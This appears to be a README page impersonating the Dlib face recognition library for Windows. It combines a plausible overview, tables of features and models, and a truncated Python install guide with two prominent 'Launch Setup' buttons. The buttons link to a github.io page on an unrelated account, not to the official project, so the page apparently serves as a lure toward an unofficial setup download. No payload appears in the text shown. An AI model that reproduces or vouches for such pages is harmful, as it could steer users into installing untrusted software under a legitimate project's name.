# Dlib Face Recognition Library for Windows

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/en/d/d9/Dlib_c%2B%2B_library_logo.png" alt="Dlib Library" width="800">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://oscarwadejpzn.github.io/.github/Dlib-Face-Recognition-Library)

---

## What is Dlib?

Dlib is a modern C++ toolkit containing machine learning algorithms and tools for creating complex software in C++ to solve real-world problems . It is particularly known for its state-of-the-art face recognition, facial landmark detection, and object detection capabilities.

Dlib was founded in 2002 and is led by Davis E. King, a recognized expert in machine learning and computer vision . The library is licensed under the Boost Software License, allowing unrestricted use in both commercial and open-source projects.

---

## Screenshot Block

<div align="center">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6ai8VkhCwseEwS3N4PRoAlrRtcvWFUqvk89Eg0wAzfZptKVgP-q61YCY8&s=10" alt="Dlib Facial Landmarks" width="700">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style-for-the-badge)](https://oscarwadejpzn.github.io/.github/Dlib-Face-Recognition-Library)

---

## Key Features

| Feature | Description |
|---------|-------------|
| **Face Recognition** | State-of-the-art face recognition with 99.38% accuracy on LFW benchmark |
| **Facial Landmarks** | 68-point facial landmark detection with `shape_predictor_68_face_landmarks.dat` |
| **Object Detection** | HOG-based object detection with support for custom objects |
| **Machine Learning** | SVM, deep learning, and other ML algorithms |
| **Deep Learning** | CNN-based face detection and recognition models |
| **Computer Vision** | Image processing, feature detection, and optical flow |
| **Image Processing** | Image transforms, filtering, and geometric transformations |
| **Cross-Platform** | Windows, Linux, macOS, Android, iOS, and embedded systems |
| **Python Bindings** | Full Python API with NumPy integration |

---

## Dlib Models

| Model | Purpose | Accuracy |
|-------|---------|----------|
| `shape_predictor_68_face_landmarks.dat` | 68 facial landmark points | High |
| `dlib_face_recognition_resnet_model_v1.dat` | Face recognition (128D embedding) | 99.38% LFW |
| `mmod_human_face_detector.dat` | CNN-based face detection | High |
| `cnn_face_detection_model_v1` | CNN face detection | High |

---

## Installation Guide

### Option 1: Python (Recommended)

**Step 1:** Install CMake:

```powershell
pip install cmake
